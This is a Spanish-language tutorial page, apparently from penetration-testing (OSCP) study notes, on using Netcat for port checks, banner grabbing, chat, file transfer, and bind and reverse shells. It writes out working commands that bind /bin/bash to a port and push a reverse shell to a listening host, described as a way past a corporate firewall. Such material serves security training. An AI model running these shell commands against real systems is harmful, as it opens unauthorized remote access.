# 1.2.1 Netcat

Netcat, lanzado por primera vez en 1995, definición más clara de Netcat: "utilidad que lee y escribe datos a través de conexiones de red, utilizando protocolos TCP o UDP".

{% embed url="https://www.neoguias.com/comando-nc" %}

{% embed url="https://blog.desdelinux.net/usando-netcat-algunos-comandos-practicos" %}

### Conexión a un puerto TCP/UDP

Como sugiere la descripción, Netcat puede ejecutarse en modo cliente o servidor. Para empezar, veamos el modo cliente. Podemos utilizar el modo cliente para conectarnos a cualquier puerto TCP/UDP, lo que nos permite:&#x20;

* Compruebe si un puerto está abierto o cerrado.&#x20;
* Lea un banner del servicio que escucha en un puerto.
* Conéctese a un servicio de red manualmente.

Comencemos usando Netcat (**`nc`**) para comprobar si el puerto TCP 22 (el servicio SSH) está abierto en una máquina. Proporcionaremos varios parámetros:&#x20;

* la opción **`-n`** para omitir la resolución de nombres DNS;&#x20;
* **`-v`** para añadir algo de verbosidad;&#x20;
* la dirección IP de destino; y&#x20;
* el número de puerto de destino:

```
$ nc -nv 192.168.100.106 22
192.168.100.106 22 (ssh) open
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5
```

En primer lugar, la conexión TCP a 192.168.100.106 en el puerto 22 (192.168.100.106:22 en la nomenclatura estándar), por lo que Netcat informa que el puerto remoto está abierto.

A continuación el servidor respondió a nuestra conexión, imprimió el mensaje de bienvenida del servidor, dependiendo al protocolo que nos conectemos obtendremos una respuesta diferente e inclusive poder interactuar con el servicio, por ejemplo, si nos conectamos a POP3.

```
$ nc -nv 192.168.100.106 110
192.168.100.106 110 (pop3) open
+OK Dovecot (Ubuntu) ready.
USER guillermocm
-ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
```

Hemos logrado conectarnos al servicio POP3 utilizando Netcat, aunque dependiendo de la configuración del servicio podríamos iniciar sesión, en este caso está deshabilitada la autenticación por este medio, ya que es inseguro.

### Escuchar en un puerto TCP/UDP

Escuchar en un puerto TCP/UDP mediante Netcat es útil para la depuración de red de aplicaciones cliente o para recibir una conexión de red TCP/UDP. Intentemos implementar un servicio de chat simple que involucre dos máquinas, utilizando Netcat como cliente y como servidor.

En un servidor con Ubuntu con dirección IP 192.168.100.106, configuramos Netcat para escuchar las conexiones entrantes en el puerto TCP 7777. Usaremos los siguientes parámetros:

* **`-n`** para deshabilitar la resolución de nombres DNS,&#x20;
* **`-l`** para crear un oyente,&#x20;
* **`-v`** para agregar algo de verbosidad y&#x20;
* \-**`p`** para especificar el número de puerto de escucha:

```
guillermocm@grafana-server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```

Ahora que hemos enlazado el puerto 7777 en este servidor a Netcat, conectemos a ese puerto desde nuestra máquina Linux e introduzcamos una línea de texto:

```
$ nc -nv 192.168.100.106 7777
192.168.100.106 7777 (cbt) open
Escribiendo desde 192.168.100.23
```

Nuestro texto se enviará al servidor Ubuntu a través del puerto TCP 7777 y podremos continuar el "chat" desde el servidor:

```
guillermocm@grafana-server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 192.168.100.23 40338 received!
Escribiendo desde 192.168.100.23
```

En resumen: en servidor: **`nc -lvnp 7777`**, el cliente: **`nc -nv 192.168.100.106 7777`**

### Transferencia de archivos con Netcat

Netcat también se puede utilizar para transferir archivos, tanto de texto como binarios, de una computadora a otra.&#x20;

Para enviar un archivo desde nuestra máquina al servidor, iniciamos una configuración que es similar al ejemplo de chat anterior, con algunas ligeras diferencias. En el servidor, nos pondremos con en escucha con Netcat en el puerto 7777 y redirigiremos cualquier salida a un archivo llamado chisel:

```
guillermocm@grafana-server:~$ nc -lvnp 7777 > chisel
Listening on [0.0.0.0] (family 0, port 7777)
```

Mientras en nuestra máquina, enviaremos chisel al servidor a través del puerto TCP 7777:

```
$ nc -nv 192.168.100.106 7777 < chisel
192.168.100.106 7777 (cbt) open
^CExiting.
```

Netcat recibe la conexión en el servidor como se muestra a continuación:

```
guillermocm@grafana-server:~$ nc -lvnp 7777 > chisel
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 192.168.100.23 40344 received!
```

No recibiremos ningún mensaje sobre el progreso de carga de archivos. En este caso, dado que el archivo que estamos cargando es pequeño, solo podemos esperar unos segundos y presionar **`ctrl+c`**, podríamos probar a ejecutar el binario para saber si funciona, solo verificaré la versión de chisel.

```
guillermocm@grafana-server:~$ ./chisel -v
1.7.6
```

Podemos ver que el binario chisel, se ha transferido correctamente.

## Administración remota con Netcat

Una de las características más útiles de Netcat es su capacidad para hacer redirección de comandos. La versión tradicional de netcat de Netcat (compilada con el indicador "-DGAPING\_SECURITY\_HOLE") habilita la opción -e, que ejecuta un programa después de realizar o recibir una conexión exitosa. Esta poderosa característica abrió todo tipo de posibilidades interesantes desde una perspectiva de seguridad y, por lo tanto, no está disponible en la mayoría de los sistemas Linux/BSD modernos.

Cuando está habilitada, esta opción puede redirigir los mensajes de entrada, salida y error de un ejecutable a un puerto TCP/UDP en lugar de a la consola predeterminada. Por ejemplo, considere el binario cmd.exe.

Por ejemplo, considere el ejecutable cmd.exe. Al redirigir stdin, stdout y stderr a la red, podemos enlazar cmd.exe a un puerto local. A cualquier persona que se conecte a este puerto se le presentará un símbolo del sistema en la computadora de destino.

Para aclarar esto, recorramos algunos escenarios más que involucran a Bob y Alice.

### Escenario Bind Shell

En nuestro primer escenario, Bob ha solicitado la ayuda de Alice (ambos usuarios de Linux) y le ha pedido que se conecte a su computadora y emita algunos comandos de forma remota. Bob tiene una dirección IP pública y está conectado directamente a Internet. Alice, sin embargo, está detrás de una conexión NAT y tiene una dirección IP interna. Para completar el escenario, Bob necesita vincular /bin/bash a un puerto TCP en su dirección IP pública y le pide a Alice que se conecte a su dirección IP y puerto.

Bob verificará su dirección IP local, luego ejecutará Netcat con la opción **`-e`** para ejecutar **`/bin/bash`** una vez que se establezca una conexión con el puerto de escucha:

```
bob@machine:~$ ifconfig eno1 | grep inet | head -n1
        inet 192.168.100.23  netmask 255.255.255.0  broadcast 192.168.100.255

bob@machine:~$ nc -lvnp 7777 -e /bin/bash
```

Ahora Netcat ha vinculado el puerto TCP 7777 a /bin/bash y redirigirá cualquier entrada, salida o mensaje de error de /bin.bash. En otras palabras, cualquier persona que se conecte al puerto TCP 7777 en la máquina de Bob (con suerte Alice) verá el símbolo del sistema de Bob. ¡Este es de hecho un “enorme agujero de seguridad”!

```
alice@machine:~$ nc -nv 192.168.100.23 7777
Connection to 192.168.100.23 7777 port [tcp/*] succeeded!

pwd
/home/gazette/Documents/OSCP/Ejemplos/chisel_1.7.6_linux_amd64

id
uid=1000(gazette) gid=1001(gazette) groups=1001(gazette)
```

Como podemos ver la siguiente imagen muestra este escenario:

![](<../../../.gitbook/assets/imagen (7).png>)

### Escenario Reverse Shell

En nuestro segundo escenario, Alice necesita la ayuda de Bob. Sin embargo, Alice no tiene control sobre el enrutador en su oficina y, por lo tanto, no puede reenviar el tráfico desde el enrutador a su máquina interna. En este escenario, podemos aprovechar otra característica útil de Netcat; la capacidad de enviar un shell de comandos a un host que escucha en un puerto específico. En esta situación, aunque Alice no puede vincular un puerto a **`/bin/bash`** localmente en su computadora y esperar que Bob se conecte, puede enviar el control de su símbolo del sistema a la máquina de Bob.

Esto se conoce como reverse shell para que esto funcione, Bob configurará primero Netcat para que escuche. Usaremos el puerto **`7777`** en nuestro ejemplo:

```
bob@machine:~$ nc -lvnp 7777
```

Ahora, Alice puede enviar una reverse shell desde su máquina Linux a Bob. Una vez más, utilizamos la opción **`-e`** para hacer que una aplicación esté disponible de forma remota, que en este caso resulta ser **`/bin/bash`**, el shell de Linux:

```
alice@machine:~$ nc -nv 192.168.100.23 7777 -e /bin/bash
192.168.100.23 7777 open
```

Una vez que se establece la conexión, Alice Netcat habrá redirigido los flujos de datos de entrada, salida y error **`/bin/bash`** a la máquina de Bob en el puerto **`7777`**, y Bob puede interactuar con ese shell:

```
bob@machine:~$ nc -lvnp 7777
Connection from 192.168.100.106:59290
whoami
alice
```

La siguiente imagen muestra el escenario de reverse shell donde Bob obtiene acceso remoto al shell en la máquina Linux de Alice, atravesando el firewall corporativo:

![](<../../../.gitbook/assets/imagen (6).png>)

